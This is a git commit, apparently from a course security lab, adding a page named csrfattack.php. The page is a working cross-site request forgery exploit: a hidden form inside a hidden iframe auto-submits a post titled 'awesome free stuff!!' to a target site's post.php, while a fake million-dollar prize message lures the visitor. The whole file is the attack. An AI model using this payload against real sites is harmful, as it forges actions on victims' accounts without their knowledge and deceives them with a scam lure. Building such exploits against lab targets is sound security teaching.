91a53c929b23b6b84d6d38aee1279abc018b261e
Hunter Sullivan <hcsullivan12@gmail.com>
2023-04-29 13:46:10 +0800

    Attack!

---
+++ project3/csrfattack.php
@@ -0,0 +1,21 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<title>HackMe</title>
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
+
+    <iframe style="display:none" name="frame" id="frame"></iframe>
+    <form name=F action=post.php method="post" target="frame" id ="form">
+        <input type="hidden" name="title" value="awesome free stuff!!">
+        <input type="hidden" name="message" value="Here you go.">
+        <input type="hidden" id="post_submit" name="post_submit" value="POST">
+    </form>
+    <script>document.getElementById('form').submit()</script>
+
+<body>
+    <h1>Congratulations!!! You've just won a million dollars!</h1>
+    <h2>Call 111-222-3333 to cash out!</h2>
+</body>
+</html>
